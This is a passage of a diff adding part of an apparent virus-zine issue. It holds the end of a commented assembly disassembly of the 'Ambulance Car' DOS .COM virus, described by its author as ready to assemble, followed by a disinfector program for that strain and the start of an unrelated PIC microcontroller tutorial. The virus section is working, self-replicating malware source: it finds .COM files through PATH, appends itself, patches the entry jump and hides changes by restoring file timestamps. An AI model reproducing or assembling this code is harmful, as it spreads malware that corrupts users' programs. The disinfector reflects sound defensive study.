+; Increase 'opened files' counter
+
+                lea     bx, [si+counter-4]
+                inc     word ptr [bx]
+
+; Open file in read/write mode (AL - 02h)
+
+                lea     dx, [si+filename-4]     ; Open a File
+                mov     ax, 3D02h               ;  [on entry AL  -  Open  mode;
+                int     21h                     ;   DS:DX - Pointer to filename
+                                                ;   (ASCIIZ string)]
+                                                ;  [returns AX - File handle]
+
+; Save file handle
+
+                mov     word ptr [si+file_handle-4], ax
+
+; Read file's first 3 bytes
+
+                mov     bx, word ptr [si+file_handle-4]
+                mov     cx, 3                   ; Read  from  File  or  Device,
+                lea     dx, [si+first_3bytes-4] ;  Using a Handle
+                mov     ah, 3Fh                 ;  [on entry BX -  File handle;
+                int     21h                     ;   CX  -  Number  of bytes  to
+                                                ;   read;  DS:DX  -  Address of
+                                                ;   buffer]
+
+; Check if already infected
+
+                mov     al, byte ptr [si+first_3bytes-4]
+                cmp     al, 0E9h                ; Is first byte a near jump?
+                jne     infect                  ; If not,  assume  virus  isn't
+                                                ;  here, so go ahead and infect
+
+; Move file pointer to real virus start (pointed to by the initial near jump)
+
+                mov     dx, word ptr [si+first_3bytes+1-4]
+                mov     bx, word ptr [si+file_handle-4]
+                add     dx, 3                   ; Add  3 bytes  to account  for
+                                                ;  the near jump
+                xor     cx, cx                  ; Move File Pointer (LSEEK)
+                mov     ax, 4200h               ;  [on entry BX -  File handle;
+                int     21h                     ;   CX:DX -  Offset,  in bytes;
+                                                ;   AL   -   Mode  code  ( Move
+                                                ;   pointer  CX:DX  bytes  from
+                                                ;   beginning of file, AL - 0)]
+
+; Read first 6 bytes from that location
+
+                mov     bx, word ptr [si+file_handle-4]
+                mov     cx, 6
+                lea     dx, [si+six_bytes-4]
+                mov     ah, 3Fh                 ; Read  from  File  or  Device,
+                int     21h                     ;  Using a Handle
+
+; Double-check if already infected
+;
+; Compares the bytes read  with the first part of the  displacement calculation
+;  code
+
+                mov     ax, word ptr [si+six_bytes-4]
+                mov     bx, word ptr [si+six_bytes+2-4]
+                mov     cx, word ptr [si+six_bytes+4-4]
+                cmp     ax, word ptr [si+ambulance_car]
+                jne     infect
+                cmp     bx, word ptr [si+ambulance_car+2]
+                jne     infect
+                cmp     cx, word ptr [si+ambulance_car+4]
+                je      close_file              ; If already infected,  then go
+                                                ;  ahead and close the file
+
+infect:
+
+; Reset file pointer to end of file (AL - 2)
+
+                mov     bx, word ptr [si+file_handle-4]
+                xor     cx, cx
+                xor     dx, dx                  ; Move File Pointer (LSEEK)
+                mov     ax, 4202h               ;  [returns DX:AX - New pointer
+                int     21h                     ;   location]
+
+; Calculate virus' near jump relative offset
+
+                sub     ax, 3                   ; Account for the near jump
+                mov     word ptr [si+relative_offset-4], ax
+
+; Get and save file's date and time (AL - 0)
+
+                mov     bx, word ptr [si+file_handle-4]
+                mov     ax, 5700h               ; Get a File's Date and Time
+                int     21h                     ;  [on entry BX - File handle]
+                push    cx                      ;  [returns  CX  -  Time;  DX -
+                push    dx                      ;   Date]
+
+; Write virus body to end of file
+
+                mov     bx, word ptr [si+file_handle-4]
+                mov     cx, virus_body - real_start
+                lea     dx, [si+ambulance_car]  ; Write to  a File  or  Device,
+                mov     ah, 40h                 ;  Using a Handle
+                int     21h                     ;  [on entry BX  - File handle;
+                                                ;   CX  -  Number  of  bytes to
+                                                ;   write;  DS:DX  - Address of
+                                                ;   buffer]
+
+; Write host's first 3 bytes to after virus body
+
+                mov     bx, word ptr [si+file_handle-4]
+                mov     cx, 3
+                lea     dx, [si+first_3bytes-4]
+                mov     ah, 40h                 ; Write to  a File  or  Device,
+                int     21h                     ;  Using a Handle
+
+; Move file pointer to beginning of file
+
+                mov     bx, word ptr [si+file_handle-4]
+                xor     cx, cx
+                xor     dx, dx
+                mov     ax, 4200h               ; Move File Pointer (LSEEK)
+                int     21h
+
+; Write jump-to-virus-body code to beginning of file
+
+                mov     bx, word ptr [si+file_handle-4]
+                mov     cx, 3
+                lea     dx, [si+jump_code-4]
+                mov     ah, 40h                 ; Write to  a File  or  Device,
+                int     21h                     ;  Using a Handle
+
+; Reset file's date and time to previous (AL - 1)
+
+                pop     dx
+                pop     cx
+                mov     bx, word ptr [si+file_handle-4]
+                mov     ax, 5701h               ; Set a File's Date and Time
+                int     21h                     ;  [on entry BX  - File handle;
+                                                ;   CX - Time; DX - Date]
+
+close_file:
+                mov     bx, word ptr [si+file_handle-4]
+                mov     ah, 3Eh                 ; Close a File Handle
+                int     21h                     ;  [on entry BX - File handle]
+
+                retn
+
+search_n_infect endp
+
+
+; Find a file to infect, in the PATH or in the current directory
+;---------------------------------------------------------------
+search          proc    near
+
+                mov     ax, ds:PSP_environment_seg
+                mov     es, ax
+
+                push    ds
+                mov     ax, BDA_addr
+                mov     ds, ax
+                mov     bp, ds:BDA_timer_counter
+                pop     ds
+
+; Where to infect
+;
+; Probability of  infecting in the  current directory  (none of  the first  two
+;  lower bits of BP being set) is 1/4 (25%),  while probability of searching in
+;  the PATH for a directory where to infect (one or both of the first two lower
+;  bits of BP being set) is 3/4 (75%)
+
+                test    bp, 00000011b           ; Check if we are  to infect in
+                jz      check_cur_dir           ;  the current  directory or in
+                                                ;  a PATH directory
+
+; Find the PATH string in the environment block
+;
+; Format of environment block (from Ralph Brown's Interrupt List):
+;
+; Offset  Size    Description
+; ------  ----    -----------
+; 00h     N BYTEs first environment variable, ASCIIZ string of form "var=value"
+;         N BYTEs second environment variable, ASCIIZ string
+;           ...
+;         N BYTEs last environment variable, ASCIIZ string of form "var=value"
+;           BYTE  00h
+;---DOS 3.0+ ---
+;           WORD  number of strings following environment (normally 1)
+;         N BYTEs ASCIIZ full pathname of program owning this environment
+;                 (other strings may follow)
+
+                xor     bx, bx                  ; Point to the first character
+check_if_PATH:
+                mov     ax, es:[bx]
+                cmp     ax, 'AP'
+                jne     not_PATH
+                cmp     word ptr es:[bx+2], 'HT'
+                je      PATH_found
+not_PATH:
+                inc     bx
+                or      ax, ax                  ; Check if both  AH and AL  are 
+                jnz     check_if_PATH           ;  equal  to zero  (meaning the
+                                                ;  standard  environment  block
+                                                ;  is over)
+
+; Setup to check in the current directory
+
+check_cur_dir:
+                lea     di, [si+file_mask-4]    ; Point to file mask holder
+                jmp     short find_file
+
+; Find a directory in the PATH
+
+PATH_found:
+                add     bx, 5                   ; Point to after 'PATH='
+
+find_dir:
+                lea     di, [si+pathname-4]     ; Point to PATH name holder
+
+get_character:
+                mov     al, es:[bx]
+                inc     bx
+                or      al, al                  ; Are  we  at the  end of  this
+                jz      patch_dir               ;  PATH string?
+
+                cmp     al, ';'                 ; Is  this  a  PATH   directory
+                je      check_if_this_one       ;  separator?
+
+                mov     [di], al                ; Write this  character  to the 
+                inc     di                      ;  PATH name holder
+                jmp     short get_character
+
+check_if_this_one:
+                cmp     byte ptr es:[bx], 0     ; Are  we  at the  end of  this
+                je      patch_dir               ;  PATH string?
+
+                shr     bp, 1                   ; Get  rid  of  the  first  two
+                shr     bp, 1                   ;  lower  bits,   because  it's
+                                                ;  already known that  at least
+                                                ;  one them is set
+
+; Which directory to choose
+;
+; Probability of  infecting in the found directory  (none of  the first  two
+;  lower bits of BP being set) is 1/4 (25%),  while probability of searching in
+;  the PATH for another directory where to infect (one or both of the first two
+;  lower bits of BP being set) is 3/4 (75%)
+
+                test    bp, 00000011b           ; Check if we are to search for
+                jnz     find_dir                ;  files in this directory or
+                                                ;  not
+
+patch_dir:
+                cmp     byte ptr [di-1], '\'    ; Does  the  directory  already
+                je      find_file               ;  have an ending '\'?
+
+                mov     byte ptr [di], '\'      ; If not, then add one
+                inc     di
+
+; Find a file to infect
+
+find_file:
+                push    ds
+                pop     es
+                mov     [si+filename_ptr-4], di ; Save current  location within
+                                                ;  the pathname/file_mask
+
+                mov     ax, '.*'                ; Set file mask
+                stosw
+                mov     ax, 'OC'
+                stosw
+                mov     ax, 'M'
+                stosw
+
+                push    es
+                mov     ah, 2Fh                 ; Get   Disk  Transfer  Address
+                int     21h                     ;  (DTA)
+                                                ;  [returns ES:BX -  Address of
+                                                ;   current DTA]
+
+                mov     ax, es
+                mov     word ptr [si+DTA_seg-4], ax     ; Save DTA segment
+                mov     word ptr [si+DTA_off-4], bx     ; Save DTA offset
+                pop     es
+
+                lea     dx, [si+new_DTA-4]      ; Setup new DTA
+
+                mov     ah, 1Ah                 ; Set Disk Transfer Address
+                int     21h                     ;  [on entry DS:DX - Address of
+                                                ;   DTA]
+
+                lea     dx, [si+file_mask-4]    ; Setup  file  mask   (with  or
+                                                ;  without a PATH directory)
+                xor     cx, cx                  ; Search for normal files only
+
+                mov     ah, 4Eh                 ; Find First Matching File
+                int     21h                     ;  [on   entry   CX   -    File
+                                                ;   attribute; DS:DX -  pointer
+                                                ;   to filespec (ASCIIZ string)
+
+                jnc     file_found              ; File found? (and no errors?)
+
+; If no file found, then clear the file mask
+
+                xor     ax, ax
+                mov     word ptr [si+file_mask-4], ax
+                jmp     short restore_DTA
+
+; Check if we are to infect this file or find another one
+;
+; Probability of  keeping the found  file is 1/8 (12.5%)  while probability  of
+;  searching for another one is 7/8 (87.5%)
+
+file_found:
+                push    ds
+                mov     ax, BDA_addr
+                mov     ds, ax
+
+                ror     bp, 1
+                xor     bp, ds:BDA_timer_counter
+                pop     ds
+
+                test    bp, 00000111b
+                jz      file_picked             ; Keep this file?
+                                                ; If not, then...
+
+                mov     ah, 4Fh                 ; Find Next Matching File
+                int     21h
+
+                jnc     file_found              ; File found? (and no errors?)
+
+; Either a file was picked or no more files where found (so keep last one)
+
+file_picked:
+                mov     di, [si+filename_ptr-4] ; Point to after path, if any
+                lea     bx, [si+f_name-4]
+
+; Copy the file name of the found file to our filename/pathname holder
+
+store_filename:
+                mov     al, [bx]
+                inc     bx
+                stosb
+                or      al, al                  ; Is the file name over?
+                jnz     store_filename          ; If not,  then copy  the  next
+                                                ;  character
+
+restore_DTA:
+                mov     bx, word ptr [si+DTA_off-4]     ; Get old DTA offset
+                mov     ax, word ptr [si+DTA_seg-4]     ; Get old DTA segment
+                push    ds
+                mov     ds, ax
+                mov     ah, 1Ah                 ; Set Disk Transfer Address
+                int     21h
+                pop     ds
+
+                retn
+
+search          endp
+
+
+; Check if payload will be shown or not
+;--------------------------------------
+payload         proc    near
+
+; Check if payload will be shown
+;
+; The  payload  will  be shown  only  when the  counter-of-opened-files matches
+;  ...x110 (in binary)  which happens at:  6, 14, 22, 30, 38, ... 65534.  Then,
+;  when the counter reaches its limit (65535) and goes back to zero, everything
+;  starts again. So probability of the payload being shown is 1/8 (12.5%) and
+;  of not is 7/8 (87.5%)
+
+                push    es
+                mov     ax, word ptr [si+counter-4]
+                and     ax, 00000111b
+                cmp     ax, 00000110b           ; Show  payload   every   eight
+                jne     exit_payload            ;  (starting  with  the  sixth)
+                                                ;  time
+
+; Did we already show the payload? (since the computer was (re)booted)
+
+                mov     ax, BDA_addr
+                mov     es, ax
+                mov     ax, es:BDA_LPT3_port_addr
+                or      ax, ax                  ; If the  LPT3 port  is in use,
+                jnz     exit_payload            ;  don't show payload
+
+; Mark LPT3 port as in use, so that the payload won't be shown again
+
+                inc     word ptr es:BDA_LPT3_port_addr
+                call    show_payload
+
+exit_payload:
+                pop     es
+
+                retn
+
+payload         endp
+
+
+; Setup and show the 'ambulance car' payload
+;-------------------------------------------
+show_payload    proc    near
+
+; Check video mode
+;
+; Text mode 3 (80x25) - video buffer address = 0B800h
+; Text mode 7 (80x25) - video buffer address = 0B000h
+
+                push    ds
+                mov     di, 0B800h
+                mov     ax, BDA_addr
+                mov     ds, ax
+                mov     al, ds:BDA_video_mode
+                cmp     al, 7                   ; Check which  video mode we're
+                jne     setup_video_n_tune      ;  on,  if not  Monochrome text
+                mov     di, 0B000h              ;  mode 7, assume mode 3
+
+setup_video_n_tune:
+                mov     es, di
+                pop     ds
+                mov     bp, 0FFF0h              ; Setup number of tones to play
+                                                ;  (will increment up to 50h)
+
+setup_animation:
+                mov     dx, 0                   ; Setup ambulance_data column
+                mov     cx, 16                  ; Number of characters that make
+                                                ;  up one ambulance_data line
+
+do_ambulance:
+                call    show_ambulance          ; Print the ambulance to screen
+                inc     dx
+                loop    do_ambulance
+
+                call    play_siren              ; Play  a tone  of the  'siren'
+                call    wait_tick               ;  and wait for a tick
+
+                inc     bp
+                cmp     bp, 50h                 ; Already played the 'ambulance
+                jne     setup_animation         ;  siren' tune 12 times?
+
+                call    speaker_off             ; If yes, then turn speaker off
+                push    ds
+                pop     es
+
+                retn
+
+show_payload    endp
+
+
+; Turn the PC speaker off
+;------------------------
+speaker_off     proc    near
+
+; Turn off the speaker
+;
+; 8255 PPI - Programmable Peripheral Interface
+; Port 61h, 8255 Port B output
+;
+; (see description below)
+
+                in      al, 61h
+                and     al, 11111100b   ; Disable timer channel 2 and  'ungate'
+                out     61h, al         ;  its output to the speaker
+
+                retn
+
+speaker_off     endp
+
+
+; Turn on the speaker and play the "ambulance siren" sound
+;------------------------------------------------------------
+play_siren      proc    near
+
+; Select tone frequency to generate
+;
+; Tone frequency is selected by means of the 3rd least significant bit of BP:
+;
+; Bit(s)                        Description
+; ------                        -----------
+; ... 3 2 1 0
+; ... x 0 x x                   Play 1st tone frequency
+; ... x 1 x x                   Play 2nd tone frequency
+;
+; If we consider A to be  the 1st tone and B to be  the 2nd tone then the whole
+;  'ambulance siren' tune will be: (AAAABBBB) x 12
+
+                mov     dx, 07D0h       ; "ambulance siren" 1st tone frequency
+                test    bp, 00000100b   ; Check if  we are  to play
+                jz      speaker_on      ;  the first or  the second
+                                        ;  tone frequency
+                mov     dx, 0BB8h       ; "ambulance siren" 2nd tone frequency
+
+; Turn on the speaker
+;
+; 8255 PPI - Programmable Peripheral Interface
+; Port 61h, 8255 Port B output
+;
+; Bit(s)                        Description
+; ------                        -----------
+; 7 6 5 4 3 2 1 0
+; . . . . . . . 1               Timer 2 gate to speaker enable
+; . . . . . . 1 .               Speaker data enable
+; x x x x x x . .               Other non-concerning fields
+
+speaker_on:
+                in      al, 61h
+                test    al, 00000011b   ; If speaker is already on, then go and
+                jnz     play_tone       ;  play the sound tone
+                or      al, 00000011b   ; Else,  enable  timer  channel  2  and
+                out     61h, al         ; 'gate' its output to the speaker
+
+; Program the PIT
+;
+; 8253 PIT - Programmable Interval Timer
+; Port 43h, 8253 Mode Control Register
+;
+; Bit(s)                        Description
+; ------                        -----------
+; 7 6 5 4 3 2 1 0
+; . . . . . . . 0               16 binary counter
+; . . . . 0 1 1 .               Mode 3, square wave generator
+; . . 1 1 . . . .               Read/Write LSB, followed by write of MSB
+; 1 0 . . . . . .               Select counter (channel) 2
+
+                mov     al, 10110110b   ; Set 8253 command register
+                out     43h, al         ;  for mode 3, channel 2, etc
+
+; Generate a tone from the speaker
+;
+; 8253 PIT - Programmable Interval Timer
+; Port 42h, 8253 Counter 2 Cassette and Speaker Functions
+
+play_tone:
+                mov     ax, dx
+                out     42h, al         ; Send LSB (Least Significant Byte)
+                mov     al, ah
+                out     42h, al         ; Send MSB (Most Significant Byte)
+
+                retn
+
+play_siren      endp
+
+
+; Show the 'ambulance car'
+;-------------------------
+show_ambulance  proc    near
+
+                push    cx
+                push    dx
+
+                lea     bx, [si+ambulance_data-4]
+                add     bx, dx          ; Setup  which   ambulance_data  column
+                                        ; were going to print
+
+                add     dx, bp          ; Don't show the ambulance_data columns
+                or      dx, dx          ;  which aren't still visible
+                js      ambulance_done
+
+                cmp     dx, 50h         ; Check if the column we're printing is
+                jae     ambulance_done  ;  past the screen limit
+                                        ; If yes,  then the don't print it
+
+                mov     di, 3200        ; Point to  beginning of  screen's 64th
+                                        ;  line
+
+                add     di, dx          ; Point to the column we're supposed to
+                add     di, dx          ;  be printing at
+
+                sub     dx, bp          ; Restore to initial column value
+
+                mov     cx, 5           ; Set it up so we're in the first line
+
+decode_character:
+                mov     ah, 7           ; Set color attribute to white
+
+; Decode the character
+;
+; It's really pretty ingenius,  each character is encoded in a way, so that for
+;  each line beyond the first one that  character is incremented by one and for
+;  each column  beyond the  first the  same thing happens.  So taken  that into
+;  account it's not difficult to  understand how it all works and how to decode
+;  the ambulance_data
+
+                mov     al, [bx]        ; Get the character
+                sub     al, 7
+                add     al, cl          ; Account for which line we're in
+                sub     al, dl          ; Account for which column we're in
+
+                cmp     cx, 5           ; Are we in the first line?
+                jne     print_character ; If we are, then...
+
+                mov     ah, 15          ; Set color attribute to high-intensity
+                                        ;  white
+
+                test    bp, 00000011b   ; Is this the  ending tone of a AAAA or
+                                        ;  BBBB tune sequence?
+                jz      print_character ; If not,  then go ahead  and print the 
+                                        ;  'siren' characters
+
+                mov     al, ' '         ; Else,  replace  them  with a ' '  (to
+                                        ;  accomplish the visual 'siren' effect
+
+print_character:
+                stosw                   ; Print the character to screen
+                add     bx, 16          ; Point to next  ambulance_data line
+                add     di, 158         ; Point to next screen line
+                loop    decode_character
+
+ambulance_done:
+                pop     dx
+                pop     cx
+
+                retn
+
+show_ambulance  endp
+
+
+; Wait for one tick (18.2 per second) to pass
+;--------------------------------------------
+wait_tick       proc    near
+
+                push    ds
+                mov     ax, BDA_addr
+                mov     ds, ax
+                mov     ax, ds:BDA_timer_counter    ; Get ticks since midnight
+check_timer:
+                cmp     ax, ds:BDA_timer_counter    ; Check  if  one  tick  has
+                je      check_timer                 ;  already passed
+                pop     ds
+
+                retn
+
+wait_tick       endp
+
+
+;--- Data from here below
+
+ambulance_data:
+   first_line   db      22h, 23h, 24h, 25h, 26h, 27h, 28h, 29h, 66h, 87h, 3Bh
+                db      2Dh, 2Eh, 2Fh, 30h, 31h
+   second_line  db      23h, 0E0h, 0E1h, 0E2h, 0E3h, 0E4h, 0E5h, 0E6h, 0E7h
+                db      0E7h, 0E9h, 0EAh, 0EBh, 30h, 31h, 32h
+   third_line   db      24h, 0E0h, 0E1h, 0E2h, 0E3h, 0E8h, 2Ah, 0EAh, 0E7h
+                db      0E8h, 0E9h, 2Fh, 30h, 6Dh, 32h, 33h
+   fourth_line  db      25h, 0E1h, 0E2h, 0E3h, 0E4h, 0E5h, 0E7h, 0E7h, 0E8h
+                db      0E9h, 0EAh, 0EBh, 0ECh, 0EDh, 0EEh, 0EFh
+   fifth_line   db      26h, 0E6h, 0E7h, 29h, 59h, 5Ah, 2Ch, 0ECh, 0EDh, 0EEh
+                db      0EFh, 0F0h, 32h, 62h, 34h, 0F4h
+
+; Here's how the ambulance looks - see under DOS (box):
+;
+;        \|/     
+; ÜÜÜÜÜÜÜÜÛÜÜÜ   
+; ÛÛÛÛß ßÛÛÛ  \  
+; ÛÛÛÛÛÜÛÛÛÛÛÛÛÛÛ
+; ßß OO ßßßßß O ß
+
+counter         dw      9
+
+jump_code:
+near_jump       db      0E9h
+relative_offset db      36h, 00h
+
+first_3bytes    db      3      dup     (?)
+
+file_handle     dw      ?
+
+virus_body:
+
+original_3bytes db      0CDh, 20h               ; 'int 20h' opcode
+                db      90h                     ; 'nop' opcode
+
+
+;--- Stuff that gets saved along with the virus ends here
+
+six_bytes       db      6       dup     (?)
+
+filename_ptr    dw      ?
+
+DTA_seg         dw      ?
+DTA_off         dw      ?
+
+file_mask:
+filename:
+pathname        db      6       dup     (?)
+                db      7       dup     (?)
+                db      67      dup     (?)
+
+new_DTA:
+   reserv       db      21      dup     (?)
+   f_attr       db      ?
+   f_time       dw      ?
+   f_date       dw      ?
+   f_size       dd      ?
+   f_name       db      13      dup     (?)
+   filler       db      85      dup     (?)
+
+
+_TEXT           ends
+                end     ambulance_car
+---------------------------------------------------------------------------8<--
+
+
+Special Thanks
+--------------
+I would like to thank Cicatrix for sending me his collection of 'Ambulance Car'
+strains, so that I would have more than two variants to study and compare.
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::...........................................FEATURE.ARTICLE
+                                                    'Ambulance Car' Disinfector
+                                                    by Chili
+
+
+Since  I  provided a  ready-to-be-assembled  virus  in  the   "'Ambulance  Car'
+Disassembly"  article,  I decided to  also write a bonus  article with  a basic
+disinfector for it.  Please note that this disinfector doesn't locate and clean
+all existing 'Ambulance Car' strains,  though it does work on more than half of
+the  strains I have  (thanks Cicatrix).  It is only  intended to work  with the
+strain I provided,  so no assurances are given as to whether it will do the job
+or not with other strains  (it also works with the  'RedXAny' strain look-alike
+and with the tamed version that only displays the payload -  this tamed version
+really isn't a virus since  it doesn't replicate and so F-PROT won't report it;
+the disinfector does report and clean it though).
+
+An infected file  can easily be cleaned by hand,  so you should try that first.
+The disinfector  will scan all .COM files  in the current  directory for  three
+things:  1.  the '0E9h' near jump code  (other strains may have the '0EBh' jump
+code  -  this won't  detect them!);  2.  the delta  offset calculation  routine
+pointed to by the near jump;  3. the ambulance data at the end of the virus (if
+you change  this into something  else the disinfector will  report this file as
+suspicious). Upon a suspicious or infected file report the user will be given a
+chance to clean it or continue on to the next file.
+
+And here is the disinfector:
+
+[NOTE: F-PROT will  report this  as a new or modified  variant of SillyC  -  go
+       figure!]
+
+--8<---------------------------------------------------------------------------
+
+; 'Ambulance Car' Disinfector
+; KILLREDX by Chili for APJ #6
+; Assemble with (TASM 4.1):
+;       tasm /ml /m2 killredx.asm
+;       tlink /t killredx.obj
+
+
+LF              equ     0Ah             ; 'Line Feed' ASCII code
+CR              equ     0Dh             ; 'Carriage Return' ASCII code
+
+
+_TEXT           segment word public 'code'
+                assume  cs:_TEXT, ds:_TEXT, es:_TEXT, ss:_TEXT
+
+                org     100h
+
+killredx        proc    far
+
+;--- Print program identification message
+
+                lea     si, killredx_msg
+                call    print_ASCIIZ
+
+;--- Find first .COM file
+
+                lea     dx, com_mask
+                xor     cx, cx
+                mov     ah, 4Eh
+                int     21h
+                jnc     open_file
+                jmp     exit
+
+open_file:
+
+;--- Print found file's name
+
+                lea     si, newline_msg
+                call    print_ASCIIZ
+                mov     si, 9Eh
+                call    print_ASCIIZ
+
+;--- Open found file
+
+                mov     dx, 9Eh
+                mov     ax, 3D02h
+                int     21h
+                jnc     read_jump
+
+;--- Print open error message
+
+                lea     si, open_msg
+                call    print_ASCIIZ
+                jmp     find_next
+
+read_jump:
+
+;--- Read jump code
+
+                xchg    ax, bx
+                mov     cx, 3
+                lea     dx, jump_code
+                mov     ah, 3Fh
+                int     21h
+                jc      read_error
+                cmp     ax, cx
+                je      check_jump
+                jmp     close_file
+
+check_jump:
+
+;--- Compare with known virus' jump code
+
+                cmp     byte ptr [jump_code], 0E9h
+                je      read_displacement
+                jmp     close_file
+
+read_displacement:
+
+;--- Move file pointer to jump offset
+
+                mov     dx, word ptr [jump_code+1]
+                add     dx, 3
+                xor     cx, cx
+                mov     ax, 4200h
+                int     21h
+
+;--- Read displacement calculation code
+
+                mov     cx, 7
+                lea     dx, displace_code
+                mov     ah, 3Fh
+                int     21h
+                jc      read_error
+                cmp     ax, cx
+                je      check_displacement
+                jmp     close_file
+
+check_displacement:
+
+;--- Compare with known virus' displacement calculation code
+
+                cmp     word ptr [displace_code], 01E8h
+                jne     exit_check
+                cmp     word ptr [displace_code+2], 0100h
+                jne     exit_check
+                cmp     word ptr [displace_code+4], 815Eh
+                jne     exit_check
+                cmp     byte ptr [displace_code+6], 0EEh
+                jne     exit_check
+                jmp     read_data
+exit_check:
+                jmp     close_file
+
+read_data:
+
+;--- Move file pointer to supposed data location
+
+                mov     cx, 0FFFFh
+                mov     dx, 0FFF1h
+                mov     ax, 4202h
+                int     21h
+
+;--- Read ambulance data
+
+                mov     cx, 2
+                lea     dx, ambulance_data
+                mov     ah, 3Fh
+                int     21h
+                jc      read_error
+                cmp     ax, cx
+                je      check_data
+                jmp     close_file
+
+read_error:
+
+;--- Print read error message
+
+                lea     si, read_msg
+                call    print_ASCIIZ
+                jmp     close_file
+
+check_data:
+
+;--- Compare with know virus' ambulance data
+
+                cmp     word ptr [ambulance_data], 0F434h
+                jne     suspicious
+
+;--- Print file infected or suspicious message
+
+                lea     si, infected_msg
+                jmp     askto_clean
+suspicious:
+                lea     si, suspicious_msg
+
+askto_clean:
+
+;--- Print and read answer to whether clean file or not
+
+                call    print_ASCIIZ
+                mov     ah, 08h
+                int     21h
+                cmp     al, 'y'
+                je      clean_file
+                cmp     al, 'Y'
+                je      clean_file
+                jmp     close_file
+
+clean_file:
+
+;--- Move file pointer to supposed original bytes location
+
+                mov     cx, 0FFFFh
+                mov     dx, 0FFFDh
+                mov     ax, 4202h
+                int     21h
+
+;--- Read host's original (first 3) bytes
+
+                mov     cx, 3
+                lea     dx, original_bytes
+                mov     ah, 3Fh
+                int     21h
+                jc      read_error
+                cmp     ax, cx
+                je      write_original
+                jmp     close_file
+
+write_original:
+
+;--- Move file pointer to beginning of file
+
+                xor     cx, cx
+                xor     dx, dx
+                mov     ax, 4200h
+                int     21h
+
+;--- Write original bytes
+
+                mov     cx, 3
+                lea     dx, original_bytes
+                mov     ah, 40h
+                int     21h
+                jc      write_error
+                cmp     ax, cx
+                je      truncate_file
+
+write_error:
+
+;--- Print write error message
+
+                lea     si, write_msg
+                call    print_ASCIIZ
+                jmp     close_file
+
+truncate_file:
+
+;--- Move file pointer to virus' jump offset (real virus start)
+
+                mov     dx, word ptr [jump_code+1]
+                add     dx, 3
+                xor     cx, cx
+                mov     ax, 4200h
+                int     21h
+
+;--- Truncate file
+
+                mov     cx, 0
+                mov     ah, 40h
+                int     21h
+                jc      write_error
+                cmp     ax, cx
+                jne     write_error
+
+                lea     si, disinfected_msg
+                call    print_ASCIIZ
+
+close_file:
+
+;--- Close file
+
+                mov     ah, 3Eh
+                int     21h
+
+find_next:
+
+;--- Find next matching file
+
+                mov     ah, 4Fh
+                int     21h
+                jc      exit
+                jmp     open_file
+
+exit:
+
+;--- Exit to DOS
+
+                lea     si, newline_msg
+                call    print_ASCIIZ
+                retn
+
+killredx        endp
+
+
+print_ASCIIZ    proc    near
+
+;--- Print an ASCIIZ string
+
+                lodsb
+                cmp     al, 0
+                je      end_ASCIIZ
+                xchg    al, dl
+                mov     ah, 02h
+                int     21h
+                jmp     print_ASCIIZ
+end_ASCIIZ:
+                retn
+
+print_ASCIIZ    endp
+
+
+killredx_msg    db      "'Ambulance Car' Disinfector", LF, CR
+                db      "KILLREDX by Chili for APJ #6", LF, CR, 0
+newline_msg     db      LF, CR, 0
+infected_msg    db      "  Infected. Clean [y/n]?", 0
+suspicious_msg  db      "  Suspicious. Attempt to cleanû (û WARNING: file may "
+                db      "be corrupted if infected by an unknown/unsupported "
+                db      "strain of Ambulance Car) [y/n]?", 0
+disinfected_msg db      LF, CR, "  Disinfected.", 0
+open_msg        db      LF, CR, "  [ERROR: opening file]", 0
+read_msg        db      LF, CR, "  [ERROR: reading from file]", 0
+write_msg       db      LF, CR, "  [ERROR: writing to file]", 0
+com_mask        db      "*.COM", 0
+jump_code       db      3       dup     (?)
+displace_code   db      7       dup     (?)
+ambulance_data  dw      ?
+original_bytes  db      3       dup     (?)
+
+_TEXT           ends
+                end     killredx
+---------------------------------------------------------------------------8<--
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::...........................................FEATURE.ARTICLE
+                                                           Assembling for PIC's
+                                                           Jan Verhoeven
+
+
+Below is a piece of assembly language for the MicroChip PIC processor. This
+particular program will flash some LED's and activate some relays based on the
+status of some control-inputs. The target MCU was the PIC 16C54, one of the
+most simple chips in that range.
+
+To give some indication of what we're upto:
+
+  RAM                25 bytes
+  ROM               512 words (of 12 bits each)
+  I/O                12 bits
+  Clockspeed          8 kHz (this project, max = 4 MHz)
+  Instructions       33
+  On-Chip-Stack       2 levels
+
+Compare this to a modern PC clone....
+
+
+RISC and Harvard architecture.
+------------------------------
+The PIC line of MCU's are RISC chips, so they use the Harvard architecture,
+and one of the results is that they have different code- and data-memories.
+
+Higher PIC's have more features, like INTerrupt sources on 4 or more pins,
+internal interrupts etcetera. All models have a watchdogtimer (WDT) which
+needs to be reset regularly (if enabled) else the MCU will reset itself.
+
+
+The PIC registers.
+------------------
+The register architecture of the PIC is somewhat odd to Intel programmer's but
+programming resembles that of the Hewlett Packard HP 11 range of calculators.
+
+Here is an overview of the registerset. Microchip refers to this as the
+"register file".
+
+    file address          name                  comment
+    ------------        --------------          --------------------
+        00              indirect calls          not a real register!
+        01              RTCC                    timer counter
+        02              PC (or IP)              lower 8 bits of it
+        03              STATUS                  flags register
+        04              FSR                     bank select of PIC 16C57
+        05              Port A                  has 4 I/O lines
+        06              Port B                  has 8 I/O lines
+        07              Port C                  8 I/O, only 16C55 and 16C57
+                                                GP register on 'C54 and 'C56
+        08              GP register             General purpose register
+        ..              ..                      ..
+        1F              GP register             General purpose register
+
+Besides these "transparant registers" there are also some hidden registers
+(which also are write only...) for processor control. These are:
+
+        TRISA           The "tristate A/B/C" registers determine the status
+        TRISB           of each pin of the I/O ports.
+        TRISC           A "1" makes it "input" and a "0" makes it an output.
+
+        OPTION          is for controlling the WDT and the RTCC
+
+And there's the ubiquitous "W" register. This is the "Working register" and is
+used to haul data back and forth. PIC registers (or "files") cannot process
+constants (or "literals"). This can only be done with the W-file. It takes
+some getting used to, but the concept is simple and straightforward and
+eventually you will get used to it and learn to appreciate it.
+
+From that moment on, you will only have to get used to the fact that data is
+nbot always ending up where you would like to have it. All instructions
+between W and F (any register or file) end with a "d" option. If "d" is a "1",
+the destination is the file F, if "d" is "0", the result will be stored in the
+W file...
+This took me some time to get used to and still is the main source of errors.
+Apart from having selected the wrong osciallator and not disabling the WDT....
+
+
+The PIC instructions.
+---------------------
+The instructions for the PIC 16C54 are as follows:
+
+    mnemonic            description
+    ----------------    -----------------------------------------
+    ADDWF   F, d        d := W + F
+    ANDLW   k           W := W AND k
